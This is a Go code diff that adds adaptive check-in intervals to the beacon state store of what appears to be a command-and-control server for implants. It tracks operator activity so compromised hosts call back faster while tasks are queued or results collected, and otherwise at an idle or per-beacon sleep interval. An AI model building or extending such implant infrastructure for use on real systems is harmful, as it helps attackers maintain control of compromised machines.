@@ -15,6 +15,13 @@ const (
 	maxResults      = 32
 	maxResultBytes  = 1 << 20
 	maxRecentNonces = 64
+
+	// Adaptive-interval policy (all clamped to [minIntervalSec, maxIntervalSec]).
+	defaultIdleIntervalSec uint32 = 10
+	defaultFastIntervalSec uint32 = 10
+	minIntervalSec         uint32 = 5
+	maxIntervalSec         uint32 = 86400
+	activeWindow                  = 5 * time.Minute
 )
 
 // Beacon is the console-facing view of a known implant.
@@ -38,26 +45,82 @@ type Result struct {
 }
 
 type beaconState struct {
-	info        BeaconInfo
-	secretB64   string
-	firstSeen   time.Time
-	lastSeen    time.Time
-	tasks       []Task
-	results     []Result
-	resultBytes int
-	nonces      map[string]struct{}
-	nonceOrder  []string
+	info            BeaconInfo
+	secretB64       string
+	firstSeen       time.Time
+	lastSeen        time.Time
+	baseIntervalSec uint32 // sleep 任务设定的单信标基准；0 = 走监听器空闲策略
+	lastActive      time.Time
+	tasks           []Task
+	results         []Result
+	resultBytes     int
+	nonces          map[string]struct{}
+	nonceOrder      []string
 }
 
 // Store holds all lite beacon state in memory.
 type Store struct {
-	mutex   sync.Mutex
-	beacons map[string]*beaconState
-	taskSeq uint32
+	mutex        sync.Mutex
+	beacons      map[string]*beaconState
+	taskSeq      uint32
+	idleInterval uint32 // 空闲（无操作员活动）时的回连间隔
+	fastInterval uint32 // 操作员活跃窗口内的回连间隔
+	nowFn        func() time.Time
 }
 
 func NewStore() *Store {
-	return &Store{beacons: map[string]*beaconState{}}
+	return &Store{
+		beacons:      map[string]*beaconState{},
+		idleInterval: defaultIdleIntervalSec,
+		fastInterval: defaultFastIntervalSec,
+		nowFn:        time.Now,
+	}
+}
+
+// SetIntervalPolicy sets the listener-level idle/fast intervals (clamped).
+func (s *Store) SetIntervalPolicy(idleSec, fastSec uint32) {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	s.idleInterval = clampInterval(idleSec, defaultIdleIntervalSec)
+	s.fastInterval = clampInterval(fastSec, defaultFastIntervalSec)
+}
+
+func clampInterval(sec, fallback uint32) uint32 {
+	if sec == 0 {
+		return fallback
+	}
+	if sec < minIntervalSec {
+		return minIntervalSec
+	}
+	if sec > maxIntervalSec {
+		return maxIntervalSec
+	}
+	return sec
+}
+
+// SetBaseInterval records a per-beacon base interval (from a sleep task).
+func (s *Store) SetBaseInterval(id string, sec uint32) {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	if st, ok := s.beacons[id]; ok && sec > 0 {
+		st.baseIntervalSec = clampInterval(sec, 0)
+	}
+}
+
+// NextInterval returns the interval hint for the implant's next sleep:
+// fast while the operator is in an active window, otherwise the beacon's
+// base (or the listener idle policy when no base was set).
+func (s *Store) NextInterval(id string) uint32 {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	now := s.nowFn()
+	if st, ok := s.beacons[id]; ok && now.Sub(st.lastActive) < activeWindow {
+		return s.fastInterval
+	}
+	if st, ok := s.beacons[id]; ok && st.baseIntervalSec > 0 {
+		return st.baseIntervalSec
+	}
+	return s.idleInterval
 }
 
 // Touch upserts the beacon, refreshes last-seen and enforces the replay
@@ -104,6 +167,7 @@ func (s *Store) QueueTask(id string, t Task) (Task, bool) {
 	s.taskSeq++
 	t.ID = s.taskSeq
 	st.tasks = append(st.tasks, t)
+	st.lastActive = s.nowFn() // 操作员在干活 → 进入活跃窗口
 	if len(st.tasks) > maxQueuedTasks {
 		dropped := st.tasks[0]
 		st.tasks = st.tasks[len(st.tasks)-maxQueuedTasks:]
@@ -160,10 +224,18 @@ func (s *Store) TakeResults(id string) []Result {
 	if !ok {
 		return nil
 	}
+	st.lastActive = s.nowFn() // 操作员拉结果 = 活跃
 	results := st.results
 	st.results = nil
 	st.resultBytes = 0
 	return results
+}
+
+// IntervalPolicy returns the current listener-level idle/fast intervals.
+func (s *Store) IntervalPolicy() (idle, fast uint32) {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	return s.idleInterval, s.fastInterval
 }
 
 func (s *Store) ListBeacons() []Beacon {
